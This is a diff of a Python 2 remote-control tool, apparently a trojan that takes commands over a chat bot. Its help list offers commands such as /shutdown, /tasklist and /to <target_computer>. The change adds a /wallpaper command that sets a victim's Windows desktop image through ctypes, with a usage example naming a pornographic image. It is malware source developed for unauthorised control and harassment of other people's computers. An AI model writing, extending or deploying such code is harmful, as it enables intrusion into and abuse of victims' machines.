@@ -501,7 +501,6 @@ def handle(msg):
 				if len(command) == 0:
 					response = 'Usage: /wallpaper C:/Users/User/Desktop/porn.jpg'
 				else:
-					print command
 					ctypes.windll.user32.SystemParametersInfoW(20, 0, command.replace('/', '//'), 3)
 					response = 'Wallpaper succesfully set.'
 			elif command == '/help':
@@ -532,7 +531,8 @@ def handle(msg):
 						'/shutdown':'', \
 						'/tasklist':'', \
 						'/to':'<target_computer>, [other_target_computer]',\
-						'/update':''}
+						'/update':'',\
+						'/wallpaper':'<target_file>'}
 				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
